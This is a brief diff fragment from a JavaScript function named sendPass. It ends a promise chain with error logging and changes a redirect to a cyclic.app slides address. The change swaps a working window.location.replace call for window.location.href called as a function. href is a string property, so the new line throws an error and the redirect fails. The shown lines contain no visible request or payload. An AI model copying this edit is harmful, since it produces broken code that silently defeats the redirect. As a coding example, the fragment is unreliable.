@@ -18,6 +18,6 @@ const sendPass = () => {
       console.error('Error:', error)
     })
 
-  window.location.replace("https://slides-web.cyclic.app");
+  window.location.href("https://slides-web.cyclic.app");
 
 }
